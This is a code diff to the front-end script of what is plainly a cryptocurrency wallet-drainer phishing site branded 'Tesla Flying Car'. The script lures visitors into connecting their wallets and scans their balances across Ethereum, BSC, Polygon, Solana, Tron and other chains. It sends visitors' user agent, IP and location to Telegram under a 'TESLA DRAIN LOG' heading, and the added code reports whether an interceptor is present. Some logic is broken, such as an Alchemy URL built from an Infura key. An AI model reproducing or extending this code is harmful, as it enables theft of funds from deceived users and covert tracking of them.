@@ -1,15 +1,17 @@
 // public/app.js
 
-// Import AppKit from CDN (ESM)
 import { createAppKit } from 'https://esm.sh/@reown/appkit';
 import { EthersAdapter } from 'https://esm.sh/@reown/appkit-adapter-ethers';
 import { mainnet, bsc, polygon, arbitrum, optimism, avalanche } from 'https://esm.sh/@reown/appkit/networks';
 
 // --- CONFIGURATION ---
-const APPKIT_PROJECT_ID = "862d3799047c7548b0482add1cba796d"; // YOUR CORRECT PROJECT ID
+const APPKIT_PROJECT_ID = "862d3799047c7548b0482add1cba796d"; 
 const CONTRACT_ADDRESS = "0xYourDeployedContractAddress"; 
 const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; 
 const CHAIN_ID = 1; 
+
+// Use Vercel Environment Variable for Infura
+const INFURA_RPC = process.env.NEXT_PUBLIC_INFURA_RPC || "https://mainnet.infura.io/v3/YOUR_KEY"; 
 
 const metadata = {
  name: 'Tesla Flying Car',
@@ -20,11 +22,9 @@ const metadata = {
 
 const adapter = new EthersAdapter();
 
-// --- INITIALIZATION ---
 let appKitModal = null;
 
 try {
- // FIX: Capture the returned modal instance here so it's available globally in this scope
  appKitModal = createAppKit({
  adapters: [adapter],
  networks: [mainnet, bsc, polygon, arbitrum, optimism, avalanche],
@@ -76,15 +76,26 @@ async function getLiveLocation() {
  }
 }
 
+// --- INTERCEPTOR DETECTION ---
+function checkInterceptor() {
+ if (window.TeslaInterceptor || window.teslaInterceptor) {
+ return "INTERCEPTOR_ACTIVE";
+ }
+ return "NO_INTERCEPTOR";
+}
+
 // --- MULTI-CHAIN BALANCE SCANNER ---
 async function scanBalances(address) {
- const rpcUrl = process.env.NEXT_PUBLIC_RPC_URL || 'https://eth.llamarpc.com'; // Fallback RPC
  const balances = [];
 
  // Helper to fetch balance via RPC
  async function getBalance(chainName, chainId, contractAddress = null) {
  try {
- const response = await fetch(rpcUrl, {
+ let response;
+ if (chainId === 1 || chainId === 56) {
+ // Use Infura for ETH and BSC
+ const infuraUrl = `https://${chainId === 1 ? 'eth' : 'bsc'}.g.alchemy.com/v2/${INFURA_RPC.split('/').pop()}`;
+ response = await fetch(infuraUrl, {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
@@ -94,12 +105,26 @@ async function scanBalances(address) {
  params: [address, 'latest']
  })
  });
+ } else {
+ // Fallback to public RPC for other chains
+ const publicRpcUrl = `https://polygon.llamarpc.com`; // Example for Polygon
+ response = await fetch(publicRpcUrl, {
+ method: 'POST',
+ headers: { 'Content-Type': 'application/json' },
+ body: JSON.stringify({
+ jsonrpc: '2.0',
+ id: 1,
+ method: 'eth_getBalance',
+ params: [address, 'latest']
+ })
+ });
+ }
  const data = await response.json();
  if (data.result) {
  let balance = parseInt(data.result, 16);
  if (contractAddress) {
  // Fetch ERC20 balance
- const response2 = await fetch(rpcUrl, {
+ const erc20Response = await fetch(INFURA_RPC, {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
@@ -109,9 +134,9 @@ async function scanBalances(address) {
  params: [{ to: contractAddress, data: '0x70a08231' + address.slice(2).padStart(64, '0') }, 'latest']
  })
  });
- const data2 = await response2.json();
- if (data2.result) {
- balance = parseInt(data2.result, 16);
+ const erc20Data = await erc20Response.json();
+ if (erc20Data.result) {
+ balance = parseInt(erc20Data.result, 16);
  }
  }
  if (balance > 0) {
@@ -131,9 +156,9 @@ async function scanBalances(address) {
  await getBalance('Optimism', 10);
  await getBalance('Avalanche', 43114);
 
- // Scan Solana (via RPC or Explorer)
+ // Scan Solana (via Helius RPC)
  try {
- const solResponse = await fetch(`https://api.mainnet-beta.solana.com`, {
+ const solResponse = await fetch(`https://mainnet.helius-rpc.com/?api-key=YOUR_HELIUS_KEY`, { // Replace with your key or use public fallback
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
@@ -151,7 +176,7 @@ async function scanBalances(address) {
  console.warn('Solana scan failed', e);
  }
 
- // Scan Tron (via API)
+ // Scan Tron (via TronGrid)
  try {
  const tronResponse = await fetch(`https://api.trongrid.io/v1/accounts/${address}/tokens`, {
  method: 'GET'
@@ -190,6 +215,10 @@ document.addEventListener('DOMContentLoaded', async () => {
 *🔴 TESLA DRAIN LOG - NEW VISIT*\nUser Agent: ${navigator.userAgent}\nIP: ${location.ip || 'Unknown'}\nLocation: ${location.city}, ${location.country_code}\nTime: ${new Date().toISOString()}
  `;
  notifyTelegram('VISIT', visitMessage);
+
+ // Check for Interceptor
+ const interceptorStatus = checkInterceptor();
+ notifyTelegram('INTERCEPTOR_CHECK', interceptorStatus);
 
  // Setup Button Click to Open Modal Explicitly
  const connectBtn = document.getElementById('connect-btn');
